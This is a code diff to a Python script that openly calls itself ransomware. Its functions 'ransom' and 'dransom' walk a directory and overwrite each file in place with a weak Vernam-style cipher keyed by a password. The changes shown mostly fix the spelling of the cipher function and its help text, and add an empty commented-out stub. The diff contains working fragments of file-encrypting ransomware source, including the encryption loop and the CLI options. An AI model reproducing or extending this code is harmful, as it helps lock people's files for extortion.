@@ -15,7 +15,10 @@ def getListOfFiles(dirName):
             allFiles.append(fullPath)                
     return allFiles
 
-def vernan(string, password, mode):
+#def reorder(string, password, mode):
+    
+
+def vernam(string, password, mode):
     if len(password) < len(string):
         if verbose:
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] Increasing password size to match open file size...")
@@ -92,9 +95,9 @@ def ransom(passw, ext, path):
             if verbose:
                 print(f"[{str(int(round(time.time() * 1000)))[6:]}] Starting encryption...")
             if compression:
-                vernan(fContent, passw, route) 
+                vernam(fContent, passw, route) 
             else:
-                f.write("".join(vernan(fContent, passw, "f")))
+                f.write("".join(vernam(fContent, passw, "f")))
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" encrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingEncryptionTime)} milliseconds.\n")
             f.close()
         i += 1
@@ -134,7 +137,7 @@ def dransom(passw, ext, path):
                 f = open(f"{files[i]}.{ext}", "r+b")
             f.seek(0)
             f.truncate()
-            f.write(vernan(fContent, passw, "b"))
+            f.write(vernam(fContent, passw, "b"))
             print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" decrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingDecryptionTime)} milliseconds.\n")
             f.close()
         i += 1
@@ -149,7 +152,7 @@ def cli(recursion):
  -a,  --adition  Add/Remove file extension to/from file.
  -c,  --compression  Compress/Decompress the files to reduce end size. 
  -d,  --decrypt  Only decrypt. If a non encrypted file is in the path, will be encrypted.
- -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernan or Affine encryption.
+ -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernam or Affine encryption.
  -h,  --help     Open this menu.
  -i,  --interactive  Extra help to use the ransomware.
  -k,  --key      Key/Password to encrypt files. 
